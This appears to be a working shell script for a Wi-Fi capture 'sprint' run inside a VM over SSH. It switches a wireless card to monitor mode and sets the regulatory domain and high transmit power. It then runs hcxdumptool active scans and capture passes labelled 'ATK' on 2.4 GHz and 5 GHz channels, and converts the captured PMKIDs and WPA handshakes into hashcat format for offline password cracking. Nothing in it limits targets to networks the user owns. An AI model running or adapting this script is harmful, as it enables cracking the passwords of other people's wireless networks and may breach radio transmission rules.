#!/bin/sh
# Sprint4: mirrors the app's PROVEN capture preamble exactly (interface reset was the missing piece).
VMSSH="ssh -i /Users/tongbao/.ssh/vm_tongbao -p 2222 -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=6 root@127.0.0.1"
G="chroot /newroot"
BIND="mount --bind /proc /newroot/proc 2>/dev/null; mount --bind /sys /newroot/sys 2>/dev/null; mount --bind /dev /newroot/dev 2>/dev/null"
R=/tmp/sprint_result.txt
atk() {  # $1=chan(with suffix) $2=rawchan $3=txpower $4=tag $5=dur
  sudo $VMSSH "$BIND
$G pkill -x hcxdumptool 2>/dev/null; $G pkill -x tcpdump 2>/dev/null; sleep 1
$G rm -f /tmp/sp_$4*
$G ifconfig wlan0 down 2>/dev/null
$G /usr/sbin/iw dev wlan0 set type monitor 2>/dev/null
$G ifconfig wlan0 up 2>/dev/null
$G /usr/sbin/iw reg set TW 2>/dev/null
$G /usr/sbin/iw dev wlan0 set txpower fixed $3 2>/dev/null
$G /usr/sbin/iw dev wlan0 set channel $2 2>/dev/null
sleep 3
$G timeout $5 hcxdumptool -i wlan0 -c $1 -w /tmp/sp_$4 -t 7 --rds=2 2>&1 | tail -14
echo ==CONVERT $4==
$G hcxpcapngtool --all -o /tmp/sp_$4.22000 /tmp/sp_$4 2>&1 | tail -3
echo \"COUNT $4: PMKID=\$(grep -c PMKID /tmp/sp_$4.22000 2>/dev/null) HS=\$(grep -c '^WPA\*2' /tmp/sp_$4.22000 2>/dev/null) E=\$(grep -c '^WPA\*1' /tmp/sp_$4.22000 2>/dev/null)\"
$G ls -la /tmp/sp_$4 2>&1 | tail -1" >> $R 2>&1
}
echo "SPRINT4 armed $(date +%H:%M:%S)" > $R
sudo pkill -STOP -f mac_wifi_app_v2 2>/dev/null
echo "APP_FROZEN $(date +%H:%M:%S)" >> $R
phy=$(sudo $VMSSH 'ls /sys/class/ieee80211/ 2>/dev/null' 2>/dev/null)
[ -z "$phy" ] && { echo "NO_PHY_NOW" >> $R; sudo pkill -CONT -f mac_wifi_app_v2; exit 0; }
echo "PHY_UP $phy $(date +%H:%M:%S)" >> $R
echo "== RC36B_ACTIVE_SCAN ==" >> $R
sudo $VMSSH "$BIND
$G pkill -x hcxdumptool 2>/dev/null; $G pkill -x tcpdump 2>/dev/null; sleep 1
$G ifconfig wlan0 down; $G /usr/sbin/iw dev wlan0 set type monitor; $G ifconfig wlan0 up
$G /usr/sbin/iw reg set TW; $G /usr/sbin/iw dev wlan0 set txpower fixed 1000
$G timeout 25 hcxdumptool -i wlan0 -c 36b --rcascan=active 2>&1 | grep -aE 'PROBERESPONSE|BEACON|PROBEREQUEST|ERROR|injection|interface' | tail -8" >> $R 2>&1
echo "== ATK 2.4G ch1 ==" >> $R
atk 1a 1 3000 a24 35
echo "== ATK 5G ch36b ==" >> $R
atk 36b 36 1000 b36 35
echo "SPRINT_DONE $(date +%H:%M:%S)" >> $R
sudo pkill -CONT -f mac_wifi_app_v2 2>/dev/null
echo "APP_THAWED $(date +%H:%M:%S)" >> $R
